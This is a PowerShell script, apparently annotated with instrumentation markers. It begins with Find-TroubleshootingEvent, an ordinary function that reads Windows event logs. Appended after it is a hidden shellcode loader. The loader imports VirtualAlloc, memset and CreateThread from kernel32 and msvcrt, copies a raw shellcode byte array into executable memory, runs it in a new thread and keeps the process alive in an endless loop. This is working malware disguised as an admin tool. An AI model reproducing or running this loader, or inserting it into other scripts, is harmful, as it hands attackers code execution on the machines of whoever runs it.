 -||-> function Find-TroubleshootingEvent
{
	[OutputType()]
	[CmdletBinding()]
	param
	(
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string[]]$ComputerName	= ( -||-> hostname <-||- ),

		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[int]$EventId
	)
	 -||-> try
	{
		 -||-> @( -||-> $ComputerName <-||- ).foreach({
			 -||-> $computer = $_ <-||- 
			 -||-> $getEventParams = @{
				ComputerName =  -||-> $computer <-||- 
			} <-||- 
			 -||-> $logNames = @( -||-> Get-WinEvent @getEventParams -ListLog * <-||- ).where({  -||-> $_.RecordCount <-||-  }).LogName <-||- 
			 -||-> Write-Verbose -Message "Found log names: [$( -||-> $logNames -join ',' <-||- )]" <-||- 
			 -||-> $filterHashTable = @{
				LogName =  -||-> $logNames <-||- 	
			} <-||- 
			 -||-> if ( -||-> $PSBoundParameters.ContainsKey('EventId') <-||- )
			{
				 -||-> $filterHashTable.Id = $EventId <-||- 
			} <-||- 
			 -||-> $selectProperties = @( -||-> '*',@{Name =  -||-> 'ServerName' <-||- ; Expression =  -||-> { -||-> $computer <-||- } <-||- } <-||- ) <-||- 
			 -||-> Get-WinEvent @getEventParams -FilterHashTable $filterHashTable | Select-Object -Property $selectProperties <-||- 
		}) <-||- 		
	}
	catch
	{
		 -||-> $PSCmdlet.ThrowTerminatingError($_) <-||- 
	} <-||- 
} <-||- 
 -||-> $bIs = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $bIs -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xd9,0xe8,0xd9,0x74,0x24,0xf4,0xb8,0x4e,0x00,0xed,0x62,0x5b,0x31,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31,0x43,0x14,0x03,0x43,0x5a,0xe2,0x18,0x9e,0x8a,0x60,0xe2,0x5f,0x4a,0x05,0x6a,0xba,0x7b,0x05,0x08,0xce,0x2b,0xb5,0x5a,0x82,0xc7,0x3e,0x0e,0x37,0x5c,0x32,0x87,0x38,0xd5,0xf9,0xf1,0x77,0xe6,0x52,0xc1,0x16,0x64,0xa9,0x16,0xf9,0x55,0x62,0x6b,0xf8,0x92,0x9f,0x86,0xa8,0x4b,0xeb,0x35,0x5d,0xf8,0xa1,0x85,0xd6,0xb2,0x24,0x8e,0x0b,0x02,0x46,0xbf,0x9d,0x19,0x11,0x1f,0x1f,0xce,0x29,0x16,0x07,0x13,0x17,0xe0,0xbc,0xe7,0xe3,0xf3,0x14,0x36,0x0b,0x5f,0x59,0xf7,0xfe,0xa1,0x9d,0x3f,0xe1,0xd7,0xd7,0x3c,0x9c,0xef,0x23,0x3f,0x7a,0x65,0xb0,0xe7,0x09,0xdd,0x1c,0x16,0xdd,0xb8,0xd7,0x14,0xaa,0xcf,0xb0,0x38,0x2d,0x03,0xcb,0x44,0xa6,0xa2,0x1c,0xcd,0xfc,0x80,0xb8,0x96,0xa7,0xa9,0x99,0x72,0x09,0xd5,0xfa,0xdd,0xf6,0x73,0x70,0xf3,0xe3,0x09,0xdb,0x9b,0xc0,0x23,0xe4,0x5b,0x4f,0x33,0x97,0x69,0xd0,0xef,0x3f,0xc1,0x99,0x29,0xc7,0x26,0xb0,0x8e,0x57,0xd9,0x3b,0xef,0x7e,0x1d,0x6f,0xbf,0xe8,0xb4,0x10,0x54,0xe9,0x39,0xc5,0xfb,0xb9,0x95,0xb6,0xbb,0x69,0x55,0x67,0x54,0x60,0x5a,0x58,0x44,0x8b,0xb1,0xf1,0xef,0x71,0x51,0x3e,0x47,0x38,0xb9,0xd6,0x9a,0xbb,0xb8,0x9d,0x12,0x5d,0xd0,0xf1,0x72,0xf5,0x4c,0x6b,0xdf,0x8d,0xed,0x74,0xf5,0xeb,0x2d,0xfe,0xfa,0x0c,0xe3,0xf7,0x77,0x1f,0x93,0xf7,0xcd,0x7d,0x35,0x07,0xf8,0xe8,0xb9,0x9d,0x07,0xbb,0xee,0x09,0x0a,0x9a,0xd8,0x95,0xf5,0xc9,0x53,0x1f,0x60,0xb2,0x0b,0x60,0x64,0x32,0xcb,0x36,0xee,0x32,0xa3,0xee,0x4a,0x61,0xd6,0xf0,0x46,0x15,0x4b,0x65,0x69,0x4c,0x38,0x2e,0x01,0x72,0x67,0x18,0x8e,0x8d,0x42,0x98,0xf2,0x5b,0xaa,0xee,0x1a,0x58 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $0BN=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $0BN.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$0BN,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



